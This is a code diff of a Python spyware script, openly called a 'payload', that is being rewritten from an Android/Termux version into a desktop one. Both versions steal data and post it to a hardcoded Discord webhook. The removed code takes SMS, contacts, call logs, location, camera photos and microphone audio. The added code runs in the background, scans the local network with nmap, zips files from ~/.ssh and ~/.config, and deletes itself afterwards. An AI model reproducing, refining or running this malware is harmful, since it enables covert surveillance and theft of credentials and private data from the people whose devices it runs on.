@@ -1,14 +1,13 @@
 #!/usr/bin/env python3
-import os, sys, json, subprocess, time, shutil, glob, base64, urllib.request
+import os, sys, json, subprocess, time, shutil, glob, socket, threading, platform
 from pathlib import Path
 
 # ============================================================
-# CONFIGURATION - REPLACE WITH YOUR ENCODED WEBHOOK
+# CONFIGURATION - DISCORD WEBHOOK (HARDCODED)
 # ============================================================
-ENC_WEBHOOK = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTUyNzUyMzgyNTk0NjcyNjQ0MC8yZk1EUnphUHZXOHMxOU91V1RKUkhUbzZ2anNHWExFb2c0ZUlwVWJZU192bWxnOWUyV3pZUkdaWWtmcFVqYS1hbHpwVg=="
+WEBHOOK_URL = "https://discord.com/api/webhooks/1527523825946726440/2fMDRzaPvW8s19OuWTJrHTo6vjsGXLEog4eIpUbYS_vmlg9e2WzYRGZYkfpUja-alzpV"
 # ============================================================
 
-WEBHOOK_URL = base64.b64decode(ENC_WEBHOOK).decode()
 TMP_DIR = f"/tmp/payload_{os.getpid()}"
 os.makedirs(TMP_DIR, exist_ok=True)
 
@@ -18,14 +17,14 @@ def log(msg):
 
 def send_discord(content=None, file_path=None):
     try:
+        import requests
         if file_path and os.path.exists(file_path) and os.path.getsize(file_path) < 8*1024*1024:
             with open(file_path, "rb") as f:
                 files = {"file": (os.path.basename(file_path), f)}
-                urllib.request.urlopen(urllib.request.Request(WEBHOOK_URL, method="POST"), files=files)
+                requests.post(WEBHOOK_URL, files=files, timeout=10)
         elif content:
-            data = json.dumps({"content": content[:2000]}).encode()
-            req = urllib.request.Request(WEBHOOK_URL, data=data, headers={"Content-Type": "application/json"})
-            urllib.request.urlopen(req)
+            data = {"content": content[:2000]}
+            requests.post(WEBHOOK_URL, json=data, timeout=10)
     except Exception as e:
         log(f"send_discord error: {e}")
 
@@ -40,33 +39,81 @@ def run_cmd(cmd, capture=True):
     except:
         return ""
 
-def install_termux_api():
-    log("Installing termux-api package...")
-    run_cmd("pkg update -y", False)
-    run_cmd("pkg install termux-api -y", False)
-    if not os.path.exists("/data/data/com.termux/files/usr/bin/termux-battery-status"):
-        apk_path = f"{TMP_DIR}/termux-api.apk"
-        run_cmd(f"curl -L -o {apk_path} https://github.com/termux/termux-api/releases/download/v0.53.0/termux-api-app_v0.53.0+github.debug.apk", False)
-        if os.path.exists(apk_path):
-            run_cmd(f"termux-open {apk_path}", False)
-            time.sleep(3)
-    run_cmd("termux-setup-storage", False)
-    time.sleep(2)
-
-def get_device_info():
+def get_system_info():
     info = {
-        "hostname": os.uname().nodename,
+        "hostname": socket.gethostname(),
         "user": os.getenv("USER"),
         "cwd": os.getcwd(),
         "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
         "ip": run_cmd("curl -s http://api.ipify.org || echo 'N/A'").strip(),
-        "os": f"{os.uname().sysname} {os.uname().release}",
-        "android_id": run_cmd("settings get secure android_id 2>/dev/null || echo 'N/A'").strip(),
-        "model": run_cmd("getprop ro.product.model 2>/dev/null || echo 'N/A'").strip(),
-        "manufacturer": run_cmd("getprop ro.product.manufacturer 2>/dev/null || echo 'N/A'").strip(),
-        "sdk": run_cmd("getprop ro.build.version.sdk 2>/dev/null || echo 'N/A'").strip(),
+        "os": f"{platform.system()} {platform.release()}",
+        "machine": platform.machine(),
+        "processor": platform.processor(),
+        "cpu_count": os.cpu_count(),
     }
     return info
+
+def get_network_info():
+    info = {}
+    try:
+        # Get local IP
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        s.connect(("8.8.8.8", 80))
+        info["local_ip"] = s.getsockname()[0]
+        s.close()
+    except:
+        info["local_ip"] = "N/A"
+    
+    # Get network interfaces
+    try:
+        import netifaces
+        info["interfaces"] = {}
+        for iface in netifaces.interfaces():
+            addrs = netifaces.ifaddresses(iface)
+            info["interfaces"][iface] = {
+                "ipv4": addrs.get(netifaces.AF_INET, [{}])[0].get("addr", "N/A"),
+                "mac": addrs.get(netifaces.AF_LINK, [{}])[0].get("addr", "N/A"),
+            }
+    except:
+        info["interfaces"] = "netifaces not installed"
+    
+    return info
+
+def nmap_scan(target="192.168.1.0/24", ports="22,80,443,8080"):
+    """Perform nmap scan on local network"""
+    results = {"target": target, "ports": ports, "hosts": []}
+    try:
+        import nmap
+        nm = nmap.PortScanner()
+        log(f"Starting nmap scan: {target} - ports {ports}")
+        scan_result = nm.scan(hosts=target, ports=ports, arguments="-sV -T4")
+        
+        for host in nm.all_hosts():
+            host_info = {
+                "host": host,
+                "hostname": nm[host].hostname(),
+                "state": nm[host].state(),
+                "protocols": {}
+            }
+            for proto in nm[host].all_protocols():
+                ports_info = {}
+                for port in nm[host][proto].keys():
+                    ports_info[port] = {
+                        "state": nm[host][proto][port]["state"],
+                        "service": nm[host][proto][port].get("name", "unknown"),
+                        "product": nm[host][proto][port].get("product", ""),
+                        "version": nm[host][proto][port].get("version", ""),
+                    }
+                host_info["protocols"][proto] = ports_info
+            results["hosts"].append(host_info)
+        log(f"nmap scan complete: {len(results['hosts'])} hosts found")
+    except ImportError:
+        log("nmap module not installed - skipping scan")
+        results["error"] = "nmap module not installed"
+    except Exception as e:
+        log(f"nmap scan error: {e}")
+        results["error"] = str(e)
+    return results
 
 def collect_files():
     files = []
@@ -80,11 +127,12 @@ def collect_files():
         os.path.expanduser("~/storage/shared"),
         os.path.expanduser("~/.ssh"),
         os.path.expanduser("~/.termux"),
+        os.path.expanduser("~/.config"),
     ]
     for target in targets:
         if os.path.exists(target):
             for root, dirs, _ in os.walk(target):
-                if any(skip in root for skip in ["cache", ".thumbnails", "Android/data"]):
+                if any(skip in root for skip in ["cache", ".thumbnails", "Android/data", "__pycache__"]):
                     continue
                 for f in glob.glob(f"{root}/*"):
                     try:
@@ -96,74 +144,111 @@ def collect_files():
                         pass
     return files
 
-def main():
-    log("Payload started")
-    install_termux_api()
-    info = get_device_info()
-    send_discord(f"**New Victim**\n```json\n{json.dumps(info, indent=2)}\n```")
-
-    # Battery
-    batt = run_cmd("termux-battery-status 2>/dev/null || echo 'N/A'")
-    send_discord(f"**Battery**\n```\n{batt[:1500]}\n```")
-
-    # Location
-    loc = run_cmd("termux-location -p gps -f once 2>/dev/null || termux-location -p network -f once 2>/dev/null || echo 'N/A'")
-    send_discord(f"**Location**\n```\n{loc[:1500]}\n```")
-
-    # Contacts
-    contacts = run_cmd("termux-contact-list 2>/dev/null | head -c 3000 || echo 'N/A'")
-    send_discord(f"**Contacts**\n```json\n{contacts}\n```")
-
-    # SMS (last 50)
-    sms = run_cmd("termux-sms-list -l 50 2>/dev/null | head -c 3000 || echo 'N/A'")
-    send_discord(f"**SMS (last 50)**\n```json\n{sms}\n```")
-
-    # Call log (last 50)
-    calls = run_cmd("termux-call-log -l 50 2>/dev/null | head -c 3000 || echo 'N/A'")
-    send_discord(f"**Call Log (last 50)**\n```json\n{calls}\n```")
-
-    # Camera photo
-    photo_path = f"{TMP_DIR}/camera_photo.jpg"
-    run_cmd(f"termux-camera-photo -c 0 {photo_path} 2>/dev/null", False)
-    time.sleep(2)
-    if os.path.exists(photo_path) and os.path.getsize(photo_path) > 0:
-        send_discord("📸 Camera photo", photo_path)
-
-    # Microphone recording (5s)
-    audio_path = f"{TMP_DIR}/mic_recording.amr"
-    run_cmd(f"termux-microphone-record -d 5 -f {audio_path} 2>/dev/null", False)
-    time.sleep(6)
-    if os.path.exists(audio_path) and os.path.getsize(audio_path) > 0:
-        send_discord("🎤 Microphone recording (5s)", audio_path)
-
-    # Files
-    files = collect_files()
-    if files:
-        zip_path = f"{TMP_DIR}/files.zip"
+def get_installed_packages():
+    """Get list of installed packages (pip and pkg)"""
+    packages = {}
+    try:
+        # pip packages
+        pip_list = run_cmd("pip list --format=json")
         try:
-            import zipfile
-            with zipfile.ZipFile(zip_path, "w", zipfile.ZIP_DEFLATED) as zf:
-                for f in files[:50]:
-                    try:
-                        zf.write(f, os.path.basename(f))
-                    except:
-                        pass
-            if os.path.exists(zip_path) and os.path.getsize(zip_path) > 0:
-                send_discord(f"📁 Files ({len(files)} files, max 50 in zip)", zip_path)
+            import json
+            packages["pip"] = json.loads(pip_list)
+        except:
+            packages["pip"] = pip_list[:1000]
+    except:
+        packages["pip"] = "N/A"
+    
+    try:
+        # termux packages
+        pkg_list = run_cmd("pkg list-installed 2>/dev/null | head -100")
+        packages["termux"] = pkg_list
+    except:
+        packages["termux"] = "N/A"
+    
+    return packages
+
+def get_processes():
+    """Get running processes"""
+    try:
+        if platform.system() == "Linux":
+            return run_cmd("ps aux | head -50")
+        else:
+            return run_cmd("tasklist 2>/dev/null | head -50")
+    except:
+        return "N/A"
+
+def run_background(targets=None):
+    """Main payload function - runs in background thread"""
+    try:
+        log("Payload started in background")
+        
+        # 1. System info
+        info = get_system_info()
+        send_discord(f"**System Info**\n```json\n{json.dumps(info, indent=2)}\n```")
+        
+        # 2. Network info
+        net_info = get_network_info()
+        send_discord(f"**Network Info**\n```json\n{json.dumps(net_info, indent=2)}\n```")
+        
+        # 3. Nmap scan (if nmap installed)
+        if targets:
+            scan_results = nmap_scan(targets)
+            send_discord(f"**Nmap Scan Results**\n```json\n{json.dumps(scan_results, indent=2)[:1900]}\n```")
+        else:
+            # Auto-detect network
+            try:
+                local_ip = socket.gethostbyname(socket.gethostname())
+                if local_ip.startswith("192.168.") or local_ip.startswith("10.") or local_ip.startswith("172."):
+                    base = ".".join(local_ip.split(".")[:3]) + ".0/24"
+                    scan_results = nmap_scan(base)
+                    send_discord(f"**Nmap Scan Results**\n```json\n{json.dumps(scan_results, indent=2)[:1900]}\n```")
+            except:
+                pass
+        
+        # 4. Installed packages
+        packages = get_installed_packages()
+        send_discord(f"**Installed Packages**\n```json\n{json.dumps(packages, indent=2)[:1900]}\n```")
+        
+        # 5. Running processes
+        procs = get_processes()
+        send_discord(f"**Running Processes**\n```\n{procs[:1500]}\n```")
+        
+        # 6. Files
+        files = collect_files()
+        if files:
+            zip_path = f"{TMP_DIR}/files.zip"
+            try:
+                import zipfile
+                with zipfile.ZipFile(zip_path, "w", zipfile.ZIP_DEFLATED) as zf:
+                    for f in files[:50]:
+                        try:
+                            zf.write(f, os.path.basename(f))
+                        except:
+                            pass
+                if os.path.exists(zip_path) and os.path.getsize(zip_path) > 0:
+                    send_discord(f"📁 Files ({len(files)} files, max 50 in zip)", zip_path)
+            except Exception as e:
+                log(f"Zip error: {e}")
+        
+        # 7. Self-destruct
+        log("Payload completed")
+        try:
+            shutil.rmtree(TMP_DIR, ignore_errors=True)
+            os.remove(__file__)
         except:
             pass
-
-    # Self-destruct
-    send_discord("💀 Payload completed. Self-destructing.")
-    try:
-        shutil.rmtree(TMP_DIR, ignore_errors=True)
-        os.remove(__file__)
-    except:
-        pass
-
-if __name__ == "__main__":
-    try:
-        main()
+            
     except Exception as e:
         log(f"Fatal error: {e}")
-        sys.exit(0)
+
+def main():
+    # Run payload in background thread
+    import threading
+    target = sys.argv[1] if len(sys.argv) > 1 else None
+    thread = threading.Thread(target=run_background, args=(target,), daemon=True)
+    thread.start()
+    # Exit immediately - payload continues in background
+    sys.exit(0)
+
+if __name__ == "__main__":
+    main()
